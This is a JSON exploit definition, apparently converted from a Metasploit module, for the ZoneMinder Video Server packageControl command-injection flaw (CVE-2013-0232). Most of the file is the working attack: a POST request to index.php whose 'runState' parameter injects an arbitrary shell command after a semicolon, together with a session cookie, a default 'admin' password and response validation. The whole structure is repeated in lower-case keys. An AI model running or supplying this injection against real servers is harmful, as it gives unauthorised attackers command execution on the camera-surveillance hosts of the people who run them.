{
   "informations" : {
      "PLATFORM" : "UNIX",
      "PATHS" : [
         "__BASE__index.php",
         "__BASE__index.php",
         "__BASE__index.php",
         "zm/"
      ],
      "PATH" : "__BASE__index.php?",
      "METHOD" : "POST",
      "name" : "ZoneminderPackagecontrolExec",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "METHOD" : "POST",
            "PATH" : "index.php",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PAYLOAD" : "view=none&action=state&runState=start;__PAYLOAD__%26",
            "HEADERS" : {
               "Cookie" : "ZMSESSID=UZFc6N",
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #1 Request : [POST] /index.php"
         }
      },
      "TITLE" : "ZoneMinder Video Server packageControl Command Execution",
      "MSF_MODULE" : "zoneminder_packagecontrol_exec",
      "TYPE" : "MSF",
      "THE ZONEMINDER USERTITLE" : "admin",
      "REFERENCES" : [
         "http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/"
      ],
      "PAYLOAD" : "",
      "OSVDB" : 89529,
      "DESCRIPTION" : "\n\n        This module exploits a command execution vulnerability in ZoneMinder Video\n\n        Server version 1.24.0 to 1.25.0 which could be abused to allow\n\n        authenticated users to execute arbitrary commands under the context of the\n\n        web server user. The 'packageControl' function in the\n\n        'includes/actions.php' file calls 'exec()' with user controlled data\n\n        from the 'runState' parameter.\n\n      ",
      "CVE" : "CVE-2013-0232",
      "VARIABLES" : {
         "DATA" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "COOKIE" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "PATH" : {
            "DESCRIPTION" : "The path to the web application",
            "VALUE" : "/zm/"
         },
         "COMMAND" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "PASSWORD" : {
            "DESCRIPTION" : "The ZoneMinder password",
            "VALUE" : "admin"
         },
         "BASE" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      }
   },
   "detection" : {},
   "path" : "__BASE__index.php?",
   "type" : "MSF",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "the zoneminder usertitle" : "admin",
   "cve" : "CVE-2013-0232",
   "name" : "ZoneminderPackagecontrolExec",
   "references" : [
      "http://itsecuritysolutions.org/2013-01-22-ZoneMinder-Video-Server-arbitrary-command-execution-vulnerability/"
   ],
   "msf_module" : "zoneminder_packagecontrol_exec",
   "requests" : {
      "EXPLOIT1" : {
         "METHOD" : "POST",
         "PATH" : "index.php",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PAYLOAD" : "view=none&action=state&runState=start;__PAYLOAD__%26",
         "HEADERS" : {
            "Cookie" : "ZMSESSID=UZFc6N",
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #1 Request : [POST] /index.php"
      }
   },
   "osvdb" : 89529,
   "paths" : [
      "__BASE__index.php",
      "__BASE__index.php",
      "__BASE__index.php",
      "zm/"
   ],
   "platform" : "UNIX",
   "method" : "POST",
   "description" : "\n\n        This module exploits a command execution vulnerability in ZoneMinder Video\n\n        Server version 1.24.0 to 1.25.0 which could be abused to allow\n\n        authenticated users to execute arbitrary commands under the context of the\n\n        web server user. The 'packageControl' function in the\n\n        'includes/actions.php' file calls 'exec()' with user controlled data\n\n        from the 'runState' parameter.\n\n      ",
   "variables" : {
      "DATA" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "COOKIE" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "COMMAND" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "The path to the web application",
         "VALUE" : "/zm/"
      },
      "PASSWORD" : {
         "DESCRIPTION" : "The ZoneMinder password",
         "VALUE" : "admin"
      },
      "BASE" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      }
   },
   "title" : "ZoneMinder Video Server packageControl Command Execution",
   "payload" : ""
}
